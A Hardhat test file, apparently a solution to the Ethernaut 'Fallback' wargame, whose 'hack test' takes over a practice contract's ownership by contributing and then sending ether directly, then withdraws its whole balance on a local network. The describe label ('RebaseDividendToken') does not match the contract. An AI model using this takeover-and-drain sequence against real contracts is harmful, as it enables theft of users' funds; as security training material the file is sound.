const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("RebaseDividendToken Token Test", function () {
    var Fallback;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("fallback deploy", async function () {
        const FallbackInstance = await ethers.getContractFactory("Fallback");
        Fallback = await FallbackInstance.deploy();
    });
    it("hack test", async function () {
        await Fallback.connect(users[0]).contribute({ value: 0.00001 * 10 ** 18 });

        expect(await Fallback.contributions(users[0].address)).to.greaterThan(0);

        await users[0].sendTransaction({
            to: Fallback.address,
            value: 1,
        });

        expect(await Fallback.owner()).to.equal(users[0].address);

        await Fallback.connect(users[0]).withdraw();

        expect(await ethers.provider.getBalance(Fallback.address)).to.equal(0);
    });
});
